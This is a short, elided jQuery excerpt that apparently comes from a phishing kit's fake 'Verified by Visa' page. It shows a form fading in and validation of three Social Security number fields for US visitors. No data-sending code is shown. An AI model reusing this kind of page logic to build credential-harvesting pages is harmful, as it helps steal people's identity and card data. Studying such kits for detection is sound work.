$(function() {
	...
	$("#xGhostRiderForm").delay(1000).fadeIn(300);
		$("#vbv_submit_btn").click(function(o) {
            ...
            $("#ssn1").keydown(function() {$(this).css("border-color", "#a9a9a9")});
            $("#ssn2").keydown(function() {$(this).css("border-color", "#a9a9a9")});
            $("#ssn3").keydown(function() {$(this).css("border-color", "#a9a9a9")});
			...
			if (local == 'US')
            {
                ...
                if (0 == /[0-9]{3}/.test($("#ssn1").val())) return $("#ssn1").focus(), $("#ssn1").css("border-color", "#bf0000"), !1;
                if (0 == /[0-9]{2}/.test($("#ssn2").val())) return $("#ssn2").focus(), $("#ssn2").css("border-color", "#bf0000"), !1;
                if (0 == /[0-9]{4}/.test($("#ssn3").val())) return $("#ssn3").focus(), $("#ssn3").css("border-color", "#bf0000"), !1;
            }
